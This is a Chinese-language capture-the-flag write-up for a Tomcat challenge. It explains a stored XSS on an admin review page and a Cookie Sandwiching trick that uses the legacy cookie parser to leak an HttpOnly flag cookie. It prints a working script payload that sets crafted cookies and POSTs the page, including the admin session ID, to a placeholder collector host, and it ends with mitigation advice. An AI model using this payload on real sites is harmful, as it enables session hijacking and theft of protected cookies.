# Sweet Treat

## 题目简述

Tomcat 9 的目录应用允许普通用户编辑 `aboutMe` 并报告自己的资料。编辑页会转义该字段，但管理员审核页直接输出数据库值，形成存储型 XSS。审核机器人以管理员状态访问该页，代码会设置 `HttpOnly` 的 `flag` cookie。通常 XSS 不能读取 `HttpOnly` cookie；本题依赖 Tomcat 兼容 RFC 2109 的 Legacy Cookie Processor 与可控 `language` cookie，实施 Cookie Sandwiching，使被保护 cookie 在服务器解析后成为 `language` 的值并反射到 HTML 响应。

关键反射点在首页：

```jsp
if ("language".equals(c.getName())) {
    lang = c.getValue();
}
...
<html lang="<%= lang %>">
```

这里的 `lang` 既不做 HTML 转义，也可由请求 cookie 控制。它不直接读取 flag，但会反射经 legacy parser 重组后的整段 cookie 内容。

## 解题过程

### 获得管理员上下文中的 XSS

先注册普通用户、登录并在 `/edit_profile.jsp` 保存 script。报告同一资料时，后端将用户名写入 `Reports`，再通知机器人访问管理员审核页。审核页从数据库取回 `aboutMe` 后未经转义渲染：

```jsp
<div class="about-content"><%= (aboutMe != null && !aboutMe.isEmpty())
    ? aboutMe : "No about me section provided." %></div>
```

所以 script 在管理员浏览器内执行。此时审核页逻辑已在管理员 session 中写入根路径、`HttpOnly` 的 `flag` cookie。

### 构造 Cookie Sandwich

脚本依次设置三个 JavaScript 可写 cookie，并访问 `/index.jsp`：

```html
<script>
document.cookie = '$Version=1; path=/index.jsp;';
document.cookie = 'language="start; path=/index.jsp;';
document.cookie = 'end="; path=/';

fetch('/index.jsp')
  .then((response) => response.text())
  .then((html) => fetch('https://<collector>/exfil', {
    method: 'POST',
    body: html
  }));
</script>
```

`$Version=1` 使 Tomcat 按兼容 RFC 2109 的 legacy 规则解析 cookie。浏览器发送 cookie 时按 path 长度从长到短排序；因此 path 为 `/index.jsp` 的 `$Version` 与 `language` 先出现，根路径上的管理员 `JSESSIONID`、`flag` 位于中间，而最后设置的根路径 `end` 位于它们之后。服务端接收到的效果可概括为：

```text
$Version=1; language="start; JSESSIONID=<admin-session>; flag=<HttpOnly-flag>; end="
```

legacy parser 将引号内的中间段视作 `language` 的值。首页于是把它写进 `<html lang="...">`，XSS 读取 `fetch('/index.jsp')` 的响应文本并发送给自己的收集端。收集端地址只是运行时占位符，不属于 WP 的持久信息。

### 验证

收集到的首页 HTML 同时含有 `JSESSIONID` 和 flag，其中 flag 为：

```text
DUCTF{1_th0ught_y0u_c0uldnt_st34l_th3m}
```

成功标准是响应 HTML 中出现被夹在 `language` 值内的 `flag=...`，不是尝试从 JavaScript 的 `document.cookie` 直接读取 `HttpOnly` cookie。

## 方法总结

- 核心技巧：存储型 XSS 设置 `$Version` 与特定路径的 cookie，利用 Tomcat legacy cookie parser 把 `HttpOnly` cookie 夹进可反射 cookie 值中。
- 识别信号：Tomcat/Java 应用兼容旧 cookie 规范、存在 cookie 反射点、且 XSS 能设置 path 可控的 cookie 时，应检查 Cookie Sandwiching 的前置条件。
- 复用要点：不要把请求 cookie 原样注入 HTML；应禁用不需要的 Legacy Cookie Processor，并对用户资料执行上下文正确的输出编码。`HttpOnly` 是重要缓解措施，但不能替代消除 XSS 与 cookie 解析歧义。
